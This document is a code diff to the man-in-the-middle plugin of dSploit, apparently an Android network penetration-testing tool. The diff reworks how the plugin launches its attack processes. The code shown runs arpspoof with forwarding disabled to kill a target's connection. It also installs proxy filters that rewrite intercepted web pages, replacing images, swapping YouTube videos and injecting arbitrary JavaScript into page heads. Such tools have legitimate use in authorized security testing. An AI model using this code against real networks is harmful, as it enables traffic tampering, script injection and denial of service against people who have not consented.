@@ -50,6 +50,8 @@ import java.util.regex.PatternSyntaxException;
 
 import it.evilsocket.dsploit.R;
 import it.evilsocket.dsploit.SettingsActivity;
+import it.evilsocket.dsploit.core.Child;
+import it.evilsocket.dsploit.core.ChildManager;
 import it.evilsocket.dsploit.core.Plugin;
 import it.evilsocket.dsploit.core.System;
 import it.evilsocket.dsploit.gui.dialogs.ChoiceDialog;
@@ -70,7 +72,9 @@ import it.evilsocket.dsploit.net.http.proxy.Proxy.ProxyFilter;
 import it.evilsocket.dsploit.plugins.mitm.SpoofSession.OnSessionReadyListener;
 import it.evilsocket.dsploit.core.Logger;
 import it.evilsocket.dsploit.plugins.mitm.hijacker.Hijacker;
+import it.evilsocket.dsploit.tools.ArpSpoof;
 
+//TODO: completely rewrite this class, it's monstrous
 public class MITM extends Plugin
 {
   private static final int SELECT_PICTURE = 1010;
@@ -84,6 +88,7 @@ public class MITM extends Plugin
   private Intent mScriptPicker = null;
   private ProgressBar mCurrentActivity = null;
   private SpoofSession mSpoofSession = null;
+  private Child mConnectionKillerProcess = null;
 
   static class Action{
     public int resourceId;
@@ -500,7 +505,7 @@ public class MITM extends Plugin
           if(System.checkNetworking(MITM.this) == false)
             return;
 
-          ProgressBar activity = (ProgressBar) v.findViewById(R.id.itemActivity);
+          final ProgressBar activity = (ProgressBar) v.findViewById(R.id.itemActivity);
 
           if(activity.getVisibility() == View.INVISIBLE){
             if(System.getCurrentTarget().getType() != Target.Type.ENDPOINT)
@@ -509,15 +514,35 @@ public class MITM extends Plugin
             else{
               setStoppedState();
 
-              activity.setVisibility(View.VISIBLE);
+              try {
+                mConnectionKillerProcess = System.getTools().arpSpoof.spoof(System.getCurrentTarget(), new ArpSpoof.ArpSpoofReceiver() {
 
-              Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
+                  @Override
+                  public void onStart(String cmd) {
+                    super.onStart(cmd);
+                    System.setForwarding(false);
+                  }
 
-              ConnectionKiller.start();
+                  @Override
+                  public void onError(String line) {
+                    Toast.makeText(MITM.this, "arpspoof error", Toast.LENGTH_LONG).show();
+                    activity.setVisibility(View.INVISIBLE);
+                  }
+                });
+
+                activity.setVisibility(View.VISIBLE);
+
+                Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
+              } catch (ChildManager.ChildNotStartedException e) {
+                Toast.makeText(MITM.this, "cannot start process", Toast.LENGTH_LONG).show();
+              }
             }
-          } else{
+          } else {
 
-            ConnectionKiller.stop();
+            if(mConnectionKillerProcess!=null) {
+              mConnectionKillerProcess.kill(2);
+              mConnectionKillerProcess = null;
+            }
 
             activity.setVisibility(View.INVISIBLE);
           }
@@ -636,39 +661,44 @@ public class MITM extends Plugin
 
                             final String resource = image;
                             mSpoofSession = new SpoofSession();
-                            mSpoofSession.start(new OnSessionReadyListener(){
-                              @Override
-                              public void onSessionReady(){
-                                System.getProxy().setFilter(new Proxy.ProxyFilter(){
-                                  @Override
-                                  public String onDataReceived(String headers, String data){
-                                    // handle img tags
-                                    data = data.replaceAll
-                                      (
-                                        "(?i)<img([^/]+)src=(['\"])[^'\"]+(['\"])",
-                                        "<img$1src=$2" + resource + "$3"
-                                      );
+                            try {
+                              mSpoofSession.start(new OnSessionReadyListener(){
+                                @Override
+                                public void onSessionReady(){
+                                  System.getProxy().setFilter(new ProxyFilter(){
+                                    @Override
+                                    public String onDataReceived(String headers, String data){
+                                      // handle img tags
+                                      data = data.replaceAll
+                                        (
+                                          "(?i)<img([^/]+)src=(['\"])[^'\"]+(['\"])",
+                                          "<img$1src=$2" + resource + "$3"
+                                        );
 
-                                    // handle css background declarations
-                                    data = data.replaceAll
-                                      (
-                                        "(?i)background\\s*(:|-)\\s*url\\s*[\\(|:][^\\);]+\\)?.*",
-                                        "background: url(" + resource + ")"
-                                      );
+                                      // handle css background declarations
+                                      data = data.replaceAll
+                                        (
+                                          "(?i)background\\s*(:|-)\\s*url\\s*[\\(|:][^\\);]+\\)?.*",
+                                          "background: url(" + resource + ")"
+                                        );
 
-                                    return data;
-                                  }
-                                });
-                              }
+                                      return data;
+                                    }
+                                  });
+                                }
 
-                              @Override
-                              public void onError(String error, int resId){
-                                error = error == null ? getString(resId) : error;
-                                setSpoofErrorState(error);
-                              }
-                            });
+                                @Override
+                                public void onError(String error, int resId){
+                                  error = error == null ? getString(resId) : error;
+                                  setSpoofErrorState(error);
+                                }
+                              });
 
-                            Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
+                              Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
+
+                            } catch (ChildManager.ChildNotStartedException e) {
+                              Toast.makeText(MITM.this, "cannot start process", Toast.LENGTH_LONG).show();
+                            }
                           } else
                             new ErrorDialog(getString(R.string.error), getString(R.string.error_image_url), MITM.this).show();
                         }
@@ -719,37 +749,43 @@ public class MITM extends Plugin
                     if(video.isEmpty() == false && matcher != null && matcher.find()){
                       final String videoId = matcher.group(1);
 
-                      activity.setVisibility(View.VISIBLE);
-
-                      Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
-
                       mSpoofSession = new SpoofSession();
-                      mSpoofSession.start(new OnSessionReadyListener(){
-                        @Override
-                        public void onSessionReady(){
-                          System.getProxy().setFilter(new Proxy.ProxyFilter(){
-                            @Override
-                            public String onDataReceived(String headers, String data){
-                              if(data.matches("(?s).+/v=[a-zA-Z0-9_-]+.+"))
-                                data = data.replaceAll("(?s)/v=[a-zA-Z0-9_-]+", "/v=" + videoId);
+                      try {
+                        mSpoofSession.start(new OnSessionReadyListener(){
+                          @Override
+                          public void onSessionReady(){
+                            System.getProxy().setFilter(new ProxyFilter(){
+                              @Override
+                              public String onDataReceived(String headers, String data){
+                                if(data.matches("(?s).+/v=[a-zA-Z0-9_-]+.+"))
+                                  data = data.replaceAll("(?s)/v=[a-zA-Z0-9_-]+", "/v=" + videoId);
 
-                              else if(data.matches("(?s).+/v/[a-zA-Z0-9_-]+.+"))
-                                data = data.replaceAll("(?s)/v/[a-zA-Z0-9_-]+", "/v/" + videoId);
+                                else if(data.matches("(?s).+/v/[a-zA-Z0-9_-]+.+"))
+                                  data = data.replaceAll("(?s)/v/[a-zA-Z0-9_-]+", "/v/" + videoId);
 
-                              else if(data.matches("(?s).+/embed/[a-zA-Z0-9_-]+.+"))
-                                data = data.replaceAll("(?s)/embed/[a-zA-Z0-9_-]+", "/embed/" + videoId);
+                                else if(data.matches("(?s).+/embed/[a-zA-Z0-9_-]+.+"))
+                                  data = data.replaceAll("(?s)/embed/[a-zA-Z0-9_-]+", "/embed/" + videoId);
 
-                              return data;
-                            }
-                          });
-                        }
+                                return data;
+                              }
+                            });
+                          }
 
-                        @Override
-                        public void onError(String error, int resId){
-                          error = error == null ? getString(resId) : error;
-                          setSpoofErrorState(error);
-                        }
-                      });
+                          @Override
+                          public void onError(String error, int resId){
+                            error = error == null ? getString(resId) : error;
+                            setSpoofErrorState(error);
+                          }
+                        });
+
+                        activity.setVisibility(View.VISIBLE);
+
+                        Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
+
+                      } catch (ChildManager.ChildNotStartedException e) {
+                        System.errorLogging(e);
+                        Toast.makeText(MITM.this, "cannot start process", Toast.LENGTH_LONG).show();
+                      }
                     } else
                       new ErrorDialog(getString(R.string.error), getString(R.string.error_video_url), MITM.this).show();
                   }
@@ -802,28 +838,35 @@ public class MITM extends Plugin
                         public void onInputEntered(String input){
                           final String js = input.trim();
                           if(js.isEmpty() == false || js.startsWith("<script") == false){
-                            activity.setVisibility(View.VISIBLE);
-
-                            Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
 
                             mSpoofSession = new SpoofSession();
-                            mSpoofSession.start(new OnSessionReadyListener(){
-                              @Override
-                              public void onSessionReady(){
-                                System.getProxy().setFilter(new Proxy.ProxyFilter(){
-                                  @Override
-                                  public String onDataReceived(String headers, String data){
-                                    return data.replaceAll("(?i)</head>", js + "</head>");
-                                  }
-                                });
-                              }
+                            try {
+                              mSpoofSession.start(new OnSessionReadyListener(){
+                                @Override
+                                public void onSessionReady(){
+                                  System.getProxy().setFilter(new ProxyFilter(){
+                                    @Override
+                                    public String onDataReceived(String headers, String data){
+                                      return data.replaceAll("(?i)</head>", js + "</head>");
+                                    }
+                                  });
+                                }
 
-                              @Override
-                              public void onError(String error, int resId){
-                                error = error == null ? getString(resId) : error;
-                                setSpoofErrorState(error);
-                              }
-                            });
+                                @Override
+                                public void onError(String error, int resId){
+                                  error = error == null ? getString(resId) : error;
+                                  setSpoofErrorState(error);
+                                }
+                              });
+
+                              activity.setVisibility(View.VISIBLE);
+
+                              Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
+
+                            } catch (ChildManager.ChildNotStartedException e) {
+                              System.errorLogging(e);
+                              Toast.makeText(MITM.this, "cannot start process", Toast.LENGTH_LONG).show();
+                            }
                           } else
                             new ErrorDialog(getString(R.string.error), getString(R.string.error_js_code), MITM.this).show();
                         }
@@ -865,10 +908,6 @@ public class MITM extends Plugin
                     Pattern.compile(exp);
                   }
 
-                  activity.setVisibility(View.VISIBLE);
-
-                  Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
-
                   mSpoofSession = new SpoofSession();
                   mSpoofSession.start(new OnSessionReadyListener(){
                     @Override
@@ -891,8 +930,16 @@ public class MITM extends Plugin
                       setSpoofErrorState(error);
                     }
                   });
+
+                  activity.setVisibility(View.VISIBLE);
+
+                  Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
+
                 } catch(PatternSyntaxException e){
                   new ErrorDialog(getString(R.string.error), getString(R.string.error_filter) + ": " + e.getDescription() + " .", MITM.this).show();
+                } catch (ChildManager.ChildNotStartedException e) {
+                  System.errorLogging(e);
+                  Toast.makeText(MITM.this, "cannot start process", Toast.LENGTH_LONG).show();
                 }
               } else
                 new ErrorDialog(getString(R.string.error), getString(R.string.error_filter), MITM.this).show();
